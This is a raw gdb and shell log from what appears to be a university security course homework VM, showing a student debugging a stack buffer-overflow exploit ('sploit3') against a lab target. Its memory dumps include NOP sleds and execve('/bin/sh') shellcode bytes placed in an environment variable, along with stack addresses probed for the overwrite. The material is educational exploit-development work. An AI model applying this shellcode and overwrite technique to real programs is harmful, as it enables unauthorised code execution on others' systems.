Undefined command: "0xbffffdf0-32".  Try "help".
(gdb) x/x32 0xbffffdf0-32
A syntax error in expression, near `0xbffffdf0-32'.
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x85ab608e	0xbe7cae9e	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x080484af	0xbffffde0	0xbfffff96	0x00000014
0xbffffde0:	0x90909090	0x68730090	0x636c6c65	0x3d65646f
0xbffffdf0:	0xdb31c031	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x85ab608e	0xbe7cae9e	0x00000000
(gdb) x/x 0xbffffea4
0xbffffea4:	0xbfffff89
(gdb) x/64x 0xbffffea4-32
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff89	0xbfffff96	0x00000000	0xbfffff9c
0xbffffeb4:	0xbfffffdc	0xbfffffe9	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
0xbffffed4:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xbffffee4:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffffef4:	0x00000020	0x00000005	0x00000009	0x00000007
0xbfffff04:	0xb7fdb000	0x00000008	0x00000000	0x00000009
0xbfffff14:	0x080483a0	0x0000000b	0x000003e8	0x0000000c
0xbfffff24:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbfffff34:	0x000003e8	0x00000017	0x00000001	0x00000019
0xbfffff44:	0xbfffff6b	0x0000001a	0x00000000	0x0000001f
0xbfffff54:	0xbfffffef	0x0000000f	0xbfffff7b	0x00000000
0xbfffff64:	0x00000000	0x13000000	0xa0c6613c	0x2ef8bd2b
0xbfffff74:	0xaa3e5e8d	0x69bfabbe	0x00363836	0x00000000
(gdb) x/64x 0xbfffffa1-32
0xbfffff81:	0x00000000	0x00000000	0x706d742f	0x7261742f
0xbfffff91:	0x33746567	0x90909000	0x73009090	0x6c6c6568
0xbfffffa1:	0x65646f63	0x31c0313d	0xcd17b0db	0x5e1feb80
0xbfffffb1:	0x31087689	0x074688c0	0xb00c4689	0x8df3890b
0xbfffffc1:	0x568d084e	0x3180cd0c	0x40d889db	0xdce880cd
0xbfffffd1:	0x2fffffff	0x2f6e6962	0x2f006873	0x2f706d74
0xbfffffe1:	0x67726174	0x00337465	0x90909090	0x742f0090
0xbffffff1:	0x742f706d	0x65677261	0x00003374	Cannot access memory at address 0xc0000000
(gdb) x/64x 0xbfffffa5-32
0xbfffff85:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff95:	0x90909000	0x73009090	0x6c6c6568	0x65646f63
0xbfffffa5:	0x31c0313d	0xcd17b0db	0x5e1feb80	0x31087689
0xbfffffb5:	0x074688c0	0xb00c4689	0x8df3890b	0x568d084e
0xbfffffc5:	0x3180cd0c	0x40d889db	0xdce880cd	0x2fffffff
0xbfffffd5:	0x2f6e6962	0x2f006873	0x2f706d74	0x67726174
0xbfffffe5:	0x00337465	0x90909090	0x742f0090	0x742f706d
0xbffffff5:	0x65677261	0x00003374	Cannot access memory at address 0xc0000000
(gdb) x/64x 0xbfffffa6-32
0xbfffff86:	0x2f000000	0x2f706d74	0x67726174	0x00337465
0xbfffff96:	0x90909090	0x68730090	0x636c6c65	0x3d65646f
0xbfffffa6:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb6:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc6:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd6:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe6:	0x90003374	0x90909090	0x6d742f00	0x61742f70
0xbffffff6:	0x74656772	0x00000033	Cannot access memory at address 0xc0000000
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa6
(gdb) x/x 0xbffffdfc
0xbffffdfc:	0xbffffe08
(gdb) x/x 0xbffffe08
0xbffffe08:	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3133] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls -la
total 84
drwxr-xr-x 2 student student  4096 Nov 29 20:53 .
drwxr-xr-x 6 student student  4096 Nov 26 10:49 ..
-rwxr-xr-x 1 student student   475 Nov 26 10:49 shellcode.h
-rwxrwxr-x 1 student student 10316 Nov 29 13:37 sploit0
-rw-r--r-- 1 student student  1089 Nov 27 20:20 sploit0.c
-rwxrwxr-x 1 student student 10340 Nov 29 14:12 sploit1
-rw-r--r-- 1 student student  1015 Nov 29 14:12 sploit1.c
-rwxrwxr-x 1 student student 10260 Nov 29 19:28 sploit2
-rw-r--r-- 1 student student   964 Nov 29 19:28 sploit2.c
-rwxrwxr-x 1 student student 10100 Nov 29 20:53 sploit3
-rw-r--r-- 1 student student   698 Nov 29 20:53 sploit3.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploit4.c
-rw-r--r-- 1 student student   375 Nov 26 10:49 sploitEC.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3180 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffffe9 "\220\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffe48:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe54
 source language c.
 Arglist at 0xbffffe40, args: values=0xbfffffe9 "\220\220\220\220\220"
 Locals at 0xbffffe40, Previous frame's sp is 0xbffffe48
 Saved registers:
  ebp at 0xbffffe40, eip at 0xbffffe44
(gdb) x/32 0xbffffe40-32
0xbffffe20:	2	0	-1209828784	134514011
0xbffffe30:	2	-1073742092	-1073742080	134513969
0xbffffe40:	-1073742260	134513856	-1073741847	-1073742248
0xbffffe50:	134513915	-1073741847	0	-1209919945
0xbffffe60:	2	-1073742092	-1073742080	0
0xbffffe70:	0	0	-1208242176	-1207960572
0xbffffe80:	-1207963648	0	-1208242176	-1208242176
0xbffffe90:	0	-1563340437	-1727627397	0
(gdb) x/32x 0xbffffe40-32
0xbffffe20:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffe30:	0x00000002	0xbffffef4	0xbfffff00	0x08048531
0xbffffe40:	0xbffffe4c	0x080484c0	0xbfffffe9	0xbffffe58
0xbffffe50:	0x080484fb	0xbfffffe9	0x00000000	0xb7e21637
0xbffffe60:	0x00000002	0xbffffef4	0xbfffff00	0x00000000
0xbffffe70:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe80:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe90:	0x00000000	0xa2d1516b	0x99067f7b	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffe40-32
0xbffffe20:	0x080484af	0xbffffe30	0xbfffffe9	0x00000014
0xbffffe30:	0x90909090	0x742f0090	0x742f706d	0x65677261
0xbffffe40:	0x00003374	0x080484c0	0xbfffffe9	0xbffffe58
0xbffffe50:	0x080484fb	0xbfffffe9	0x00000000	0xb7e21637
0xbffffe60:	0x00000002	0xbffffef4	0xbfffff00	0x00000000
0xbffffe70:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe80:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe90:	0x00000000	0xa2d1516b	0x99067f7b	0x00000000
(gdb) n
foo (values=<error reading variable: Cannot access memory at address 0x337c>) at target3.c:15
15	}
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
0x080484c4 in foo (values=<error reading variable: Cannot access memory at address 0x337c>) at target3.c:15
15	}
(gdb) n

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3225 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff98 "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff98 "\220\220\220\220"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/20x 0xbffffdf0-20
0xbffffddc:	0x0804855b	0x00000002	0xbffffea4	0xbffffeb0
0xbffffdec:	0x08048531	0xbffffdfc	0x080484c0	0xbfffff98
0xbffffdfc:	0xbffffe08	0x080484fb	0xbfffff98	0x00000000
0xbffffe0c:	0xb7e21637	0x00000002	0xbffffea4	0xbffffeb0
0xbffffe1c:	0x00000000	0x00000000	0x00000000	0xb7fbb000
(gdb) x/20x 0xbffffdf0-28
0xbffffdd4:	0x00000000	0xb7e37a50	0x0804855b	0x00000002
0xbffffde4:	0xbffffea4	0xbffffeb0	0x08048531	0xbffffdfc
0xbffffdf4:	0x080484c0	0xbfffff98	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff98	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff98	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff98	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0xb4a82514	0x8f7feb04	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x080484af	0xbffffde0	0xbfffff98	0x00000014
0xbffffde0:	0x90909090	0x65687300	0x6f636c6c	0x313d6564
0xbffffdf0:	0xb0db31c0	0x080484c0	0xbfffff98	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff98	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0xb4a82514	0x8f7feb04	0x00000000
(gdb) x/x $esp
0xbffffde0:	0x90909090
(gdb) x/x $ebp
0xbffffdf0:	0xb0db31c0
(gdb) q
A debugging session is active.

	Inferior 1 [process 3225] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
sploit3.c: In function ‘main’:
sploit3.c:22:32: error: ‘preface’ undeclared (first use in this function)
   char *envvar = malloc(sizeof(preface)+sizeof(shellcodeAlephOne)+1);
                                ^
sploit3.c:22:32: note: each undeclared identifier is reported only once for each function it appears in
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3306 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe94) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff8e "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffde8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffdf4
 source language c.
 Arglist at 0xbffffde0, args: values=0xbfffff8e "\220\220\220\220"
 Locals at 0xbffffde0, Previous frame's sp is 0xbffffde8
 Saved registers:
  ebp at 0xbffffde0, eip at 0xbffffde4
(gdb) x/32x 0xbffffde0-32
0xbffffdc0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdd0:	0x00000002	0xbffffe94	0xbffffea0	0x08048531
0xbffffde0:	0xbffffdec	0x080484c0	0xbfffff8e	0xbffffdf8
0xbffffdf0:	0x080484fb	0xbfffff8e	0x00000000	0xb7e21637
0xbffffe00:	0x00000002	0xbffffe94	0xbffffea0	0x00000000
0xbffffe10:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe20:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe30:	0x00000000	0x938991c7	0xa85e7fd7	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffde0-32
0xbffffdc0:	0x080484af	0xbffffdd0	0xbfffff8e	0x00000014
0xbffffdd0:	0x90909090	0x72727200	0xffa63d72	0x7300bfff
0xbffffde0:	0x6c6c6568	0x080484c0	0xbfffff8e	0xbffffdf8
0xbffffdf0:	0x080484fb	0xbfffff8e	0x00000000	0xb7e21637
0xbffffe00:	0x00000002	0xbffffe94	0xbffffea0	0x00000000
0xbffffe10:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe20:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe30:	0x00000000	0x938991c7	0xa85e7fd7	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3306] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3351 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff8a "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff8a "\220\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff8a	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff8a	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xb36013dd	0x88b01dcd	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff8a	0x00000014
0xbffffdc0:	0x90909090	0x72727200	0x72727272	0xffa63d72
0xbffffdd0:	0x7300bfff	0x080484c0	0xbfffff8a	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff8a	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xb36013dd	0x88b01dcd	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3351] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3395 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) info frame
Stack level 0, frame at 0xbffffdf0:
 eip = 0x80484c9 in main (target3.c:19); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffde8, args: argc=2, argv=0xbffffe84
 Locals at 0xbffffde8, Previous frame's sp is 0xbffffdf0
 Saved registers:
  ebp at 0xbffffde8, eip at 0xbffffdec
(gdb) x/32x 0xbffffde8-32
0xbffffdc8:	0xbffffe90	0x08048531	0xb7fbb3dc	0x08048220
0xbffffdd8:	0x08048519	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffde8:	0x00000000	0xb7e21637	0x00000002	0xbffffe84
0xbffffdf8:	0xbffffe90	0x00000000	0x00000000	0x00000000
0xbffffe08:	0xb7fbb000	0xb7fffc04	0xb7fff000	0x00000000
0xbffffe18:	0xb7fbb000	0xb7fbb000	0x00000000	0xc17924c7
0xbffffe28:	0xfaa92ad7	0x00000000	0x00000000	0x00000000
0xbffffe38:	0x00000002	0x080483a0	0x00000000	0xb7ff0010
(gdb) n
25	  foo( argv[1] );
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff88 "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff88 "\220\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xc17924c7	0xfaa92ad7	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff88	0x00000014
0xbffffdc0:	0x90909090	0x72727200	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa6	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0xc17924c7	0xfaa92ad7	0x00000000
(gdb) p/x getenv("shellcode")
$1 = 0xbfffffa7
(gdb) x/x 0xbfffffa7
0xbfffffa7:	0xdb31c031
(gdb) q
A debugging session is active.

	Inferior 1 [process 3395] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3440 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b9
Undefined command: "b9".  Try "help".
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff88 "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
 Arglist at 0xbffffdd0, args: values=0xbfffff88 "\220\220\220\220"
 Locals at 0xbffffdd0, Previous frame's sp is 0xbffffdd8
 Saved registers:
  ebp at 0xbffffdd0, eip at 0xbffffdd4
(gdb) x/32 0xbffffdd0-32
0xbffffdb0:	2	0	-1209828784	134514011
0xbffffdc0:	2	-1073742204	-1073742192	134513969
0xbffffdd0:	-1073742372	134513856	-1073741944	-1073742360
0xbffffde0:	134513915	-1073741944	0	-1209919945
0xbffffdf0:	2	-1073742204	-1073742192	0
0xbffffe00:	0	0	-1208242176	-1207960572
0xbffffe10:	-1207963648	0	-1208242176	-1208242176
0xbffffe20:	0	639094531	499630355	0
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffdc0:	0x00000002	0xbffffe84	0xbffffe90	0x08048531
0xbffffdd0:	0xbffffddc	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x2617cf03	0x1dc7c113	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdd0-32
0xbffffdb0:	0x080484af	0xbffffdc0	0xbfffff88	0x00000014
0xbffffdc0:	0x90909090	0x72727200	0x72727272	0x3d727272
0xbffffdd0:	0xbfffffa7	0x080484c0	0xbfffff88	0xbffffde8
0xbffffde0:	0x080484fb	0xbfffff88	0x00000000	0xb7e21637
0xbffffdf0:	0x00000002	0xbffffe84	0xbffffe90	0x00000000
0xbffffe00:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe10:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe20:	0x00000000	0x2617cf03	0x1dc7c113	0x00000000
(gdb) n
foo (values=0x895e1feb <error: Cannot access memory at address 0x895e1feb>) at target3.c:15
15	}
(gdb) x/x $esp
0xbffffddc:	0xbffffde8
(gdb) x/x $ebp
0xbfffffa7:	0xdb31c031
(gdb) info frame
Stack level 0, frame at 0xbfffffaf:
 eip = 0x80484c3 in foo (target3.c:15); saved eip = 0x80cd17b0
 called by frame at 0xbfffffb3
 source language c.
 Arglist at 0xbfffffa7, args: values=0x895e1feb <error: Cannot access memory at address 0x895e1feb>
 Locals at 0xbfffffa7, Previous frame's sp is 0xbfffffaf
 Saved registers:
  ebp at 0xbfffffa7, eip at 0xbfffffab
(gdb) p/x getenv("rrrrrrrrrr")
$1 = 0xbfffff98
(gdb) q
A debugging session is active.

	Inferior 1 [process 3440] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3450 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffe84) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff88 "\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdd8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffde4
 source language c.
